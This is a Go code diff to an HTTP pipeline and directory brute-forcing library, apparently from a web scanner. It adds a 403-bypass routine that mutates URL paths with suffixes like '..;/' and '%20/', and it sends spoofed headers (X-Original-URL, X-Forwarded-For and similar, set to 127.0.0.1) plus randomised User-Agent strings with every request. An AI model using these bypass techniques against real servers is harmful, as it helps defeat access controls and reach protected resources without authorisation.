@@ -6,8 +6,10 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	"github.com/quic-go/quic-go/http3"
 	"io"
 	"log"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -49,24 +51,26 @@ type PipelineHttp struct {
 }
 
 func NewPipelineHttp(args ...map[string]interface{}) *PipelineHttp {
-	nTimeout := 60
-	nIdle := 500
+	nTimeout := 5 * 60 * time.Second
+	nIdle := 1000
+	// Timeout 这个超时是设置整个请求的超时时间,一般应该设置比IdleConnTimeout更长
+	// Timeout包含了拨号、TLS握手等时间,所以应该设置长一些。
 	x1 := &PipelineHttp{
 		ver:                   1,
 		UseHttp2:              false,
 		NoLimit:               false,
 		TestHttp:              false,
 		Buf:                   &bytes.Buffer{},
-		Timeout:               time.Duration(nTimeout) * time.Second, // 拨号、连接
-		KeepAlive:             time.Duration(nTimeout) * time.Second, // 默认值（当前为 15 秒）发送保持活动探测。
-		MaxIdleConns:          nIdle,                                 // MaxIdleConns controls the maximum number of idle (keep-alive) connections across all hosts. Zero means no limit.
-		IdleConnTimeout:       180,                                   // 不限制
-		ResponseHeaderTimeout: time.Duration(nTimeout) * time.Second, // response
-		TLSHandshakeTimeout:   time.Duration(nTimeout) * time.Second, // TLSHandshakeTimeout specifies the maximum amount of time waiting to wait for a TLS handshake. Zero means no timeout.
-		ExpectContinueTimeout: 0,                                     // 零表示没有超时，并导致正文立即发送，无需等待服务器批准
-		MaxIdleConnsPerHost:   nIdle,                                 // MaxIdleConnsPerHost, if non-zero, controls the maximum idle (keep-alive) connections to keep per-host. If zero, DefaultMaxIdleConnsPerHost is used.
-		MaxConnsPerHost:       0,                                     // 控制单个Host的最大连接总数,该值默认是0，也就是不限制，连接池里的连接能用就用，不能用创建新连接
-		ErrLimit:              10,                                    // 相同目标，累计错误10次就退出
+		Timeout:               time.Duration(nTimeout*2) * time.Second, // 拨号、连接
+		KeepAlive:             time.Duration(nTimeout) * time.Second,   // 默认值（当前为 15 秒）发送保持活动探测。
+		MaxIdleConns:          nIdle,                                   // MaxIdleConns controls the maximum number of idle (keep-alive) connections across all hosts. Zero means no limit.
+		IdleConnTimeout:       nTimeout,                                // 不限制，秒
+		ResponseHeaderTimeout: time.Duration(nTimeout) * time.Second,   // response
+		TLSHandshakeTimeout:   time.Duration(nTimeout) * time.Second,   // TLSHandshakeTimeout specifies the maximum amount of time waiting to wait for a TLS handshake. Zero means no timeout.
+		ExpectContinueTimeout: 0,                                       // 零表示没有超时，并导致正文立即发送，无需等待服务器批准
+		MaxIdleConnsPerHost:   nIdle,                                   // MaxIdleConnsPerHost, if non-zero, controls the maximum idle (keep-alive) connections to keep per-host. If zero, DefaultMaxIdleConnsPerHost is used.
+		MaxConnsPerHost:       0,                                       // 控制单个Host的最大连接总数,该值默认是0，也就是不限制，连接池里的连接能用就用，不能用创建新连接
+		ErrLimit:              10,                                      // 相同目标，累计错误10次就退出
 		ErrCount:              0,
 		IsClosed:              false,
 		SetHeader:             nil,
@@ -168,6 +172,9 @@ func (r *PipelineHttp) GetClient(tr http.RoundTripper) *http.Client {
 			return http.ErrUseLastResponse /* 不进入重定向 */
 		},
 	}
+	if o, ok := c.Transport.(*http.Transport); ok {
+		o.Proxy = http.ProxyFromEnvironment
+	}
 	return c
 }
 
@@ -175,18 +182,62 @@ func (r *PipelineHttp) DoGet(szUrl string, fnCbk func(resp *http.Response, err e
 	r.DoGetWithClient(nil, szUrl, "GET", nil, fnCbk)
 }
 
+/*
+ */
+func byPass403(szU string) string {
+	a := []string{"/", "//", "/*", "/*/", "/.", "/./", "/./.", "?", "??", "???", "...;/", "/...;/", "%20/", "%09/"}
+	//a1 := []string{"%2e/", "%2f/", "/%20"} // 最后一个/ 随机替换为
+	//oU, _ := url.Parse(szU)
+	switch szU[len(szU)-1:] {
+	case "/":
+		return szU + a[rand.Int()%len(a)]
+	case "?":
+		return fmt.Sprintf("%s%05f", szU, rand.Float64())
+	default:
+		if -1 < strings.Index(szU, "?") {
+			return szU + strings.Repeat("&", rand.Int()%10) + fmt.Sprintf("%05f", rand.Float64())
+		}
+		//if rand.Int()%2 == 0 && -1 < strings.Index(oU.Path, "/") {
+		//	x := strings.Split(oU.Path, "/")
+		//	return oU.Scheme + "://" + oU.Host + strings.Join(x[0:len(x)-1])
+		//}
+		return szU
+	}
+}
+
 func (r *PipelineHttp) DoGetWithClient(client *http.Client, szUrl string, method string, postBody io.Reader, fnCbk func(resp *http.Response, err error, szU string)) {
-	r.DoGetWithClient4SetHd(client, szUrl, method, postBody, fnCbk, nil, true)
+	szUrl = byPass403(szUrl)
+	oU, _ := url.Parse(szUrl)
+	if nil == oU {
+		return
+	}
+	szLip := "127.0.0.1"
+	r.DoGetWithClient4SetHd(client, szUrl, method, postBody, fnCbk, func() map[string]string {
+		// 403 bypass, https://zhuanlan.zhihu.com/p/642297652
+		return map[string]string{
+			"Host":                      szLip,
+			"Referer":                   szUrl,
+			"X-Original-URL":            oU.Path,
+			"X-Rewrite-URL":             oU.Path,
+			"X-Originating-IP":          szLip,
+			"X-Remote-IP":               szLip,
+			"X-Client-IP":               szLip,
+			"X-Forwarded-For":           szLip,
+			"X-Forwared-Host":           szLip,
+			"X-Host":                    szLip,
+			"X-Custom-IP-Authorization": szLip,
+		}
+	}, true)
 }
 
 func (r *PipelineHttp) DoGetWithClient4SetHdNoCloseBody(client *http.Client, szUrl string, method string, postBody io.Reader, fnCbk func(resp *http.Response, err error, szU string), setHd func() map[string]string) {
-	r.DoGetWithClient4SetHd(client, szUrl, method, postBody, fnCbk, nil, false)
+	r.DoGetWithClient4SetHd(client, szUrl, method, postBody, fnCbk, setHd, false)
 }
 
 func (r *PipelineHttp) CloseResponse(resp *http.Response) {
 	if nil != resp {
+		defer resp.Body.Close()
 		io.Copy(io.Discard, resp.Body)
-		resp.Body.Close()
 	}
 }
 
@@ -233,7 +284,7 @@ func (r *PipelineHttp) DoGetWithClient4SetHd(client *http.Client, szUrl string, 
 		n1 = 50
 	}
 	if req.Header.Get("User-Agent") == "" {
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36")
+		req.Header.Set("User-Agent", fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.%05f.159 Safari/537.36", rand.Float64()))
 	}
 	//if 0 < r.Timeout {
 	//	ctx, cc := context.WithTimeout(r.Ctx, n1*r.Timeout)
@@ -268,7 +319,7 @@ func (r *PipelineHttp) DoGetWithClient4SetHd(client *http.Client, szUrl string, 
 			r.Client = r.GetRawClient4Http2()
 		}
 		oU7, _ := url.Parse(szUrl)
-		szUrl09 := "https://" + oU7.Host + oU7.Path
+		szUrl09 := "https://" + oU7.Host + strings.Split(szUrl, oU7.Host)[1]
 		r.ErrLimit = 99999999
 		r.CloseResponse(resp)
 		r.DoGetWithClient4SetHd(r.Client, szUrl09, method, postBody, fnCbk, setHd, bCloseBody)
@@ -284,6 +335,13 @@ var (
 
 func (r *PipelineHttp) Close() {
 	r.IsClosed = true
+	if r.Client != nil && r.Client.Transport != nil {
+		if tr, ok := r.Client.Transport.(*http3.RoundTripper); ok {
+			tr.Close()
+		} else if tr, ok := r.Client.Transport.(*http.Transport); ok {
+			tr.CloseIdleConnections()
+		}
+	}
 	r.StopAll()
 	r.Client = nil
 }
@@ -298,7 +356,7 @@ func (r *PipelineHttp) DoDirs(szUrl string, dirs []string, nThread int, fnCbk fu
 }
 
 func (r *PipelineHttp) testHttp2(szUrl001 string) {
-	if !r.UseHttp2 && !r.TestHttp {
+	if !r.UseHttp2 || !r.TestHttp {
 		r.TestHttp = true
 		r.UseHttp2 = true
 		c1 := r.GetRawClient4Http2()
@@ -343,7 +401,7 @@ func (r *PipelineHttp) doDirsPrivate(szUrl string, dirs []string, nThread int, f
 	if "" == oUrl.Scheme {
 		oUrl.Scheme = "http"
 	}
-	szUrl = oUrl.Scheme + "://" + oUrl.Host
+	szUrl = oUrl.Scheme + "://" + oUrl.Host + oUrl.Path
 	var wg sync.WaitGroup
 	var client *http.Client
 	r.testHttp2(szUrl)
@@ -379,7 +437,8 @@ func (r *PipelineHttp) doDirsPrivate(szUrl string, dirs []string, nThread int, f
 								s2 = "/" + s2
 							}
 							szUrl001 := szUrl + s2
-							fmt.Printf("%s\033[2K\r", szUrl001)
+							//fmt.Printf("%s\033[2K\r", szUrl001)
+							//fmt.Printf(".")
 							r.DoGetWithClient(client, szUrl001, "GET", nil, fnCbk)
 							//r.DoGet(szUrl001, fnCbk)
 							return
